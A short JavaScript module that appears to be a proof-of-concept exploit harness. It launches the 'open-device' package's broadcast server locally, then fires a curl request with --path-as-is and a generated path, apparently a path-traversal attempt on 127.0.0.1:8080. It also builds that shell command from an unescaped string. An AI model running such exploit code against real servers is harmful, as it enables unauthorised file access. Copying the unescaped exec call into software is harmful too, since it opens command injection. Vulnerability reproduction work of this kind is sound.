function exploitFunction(payload) {
  const { genstr } = payload;

  // Setup the server (omitted for brevity)
  const server = "node ./node_modules/open-device/broadcast.js";
  const exe = exec(server, (error, stdout) => {});

  // Sleep for 2 seconds to ensure the server starts
  sleep.sleep(2);

  // Craft the attack string using the payload
  const attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${genstr()}"`;

  // Execute the attack string
  exec(attack_string, (error, stdout) => {
    if (stdout) {
      console.log("Output:", stdout);
    } else {
      console.log("No output received.");
    }
  });

  // Return a dummy value to indicate the function has completed
  return "Exploitation attempt completed.";
}

module.exports = { exploitFunction };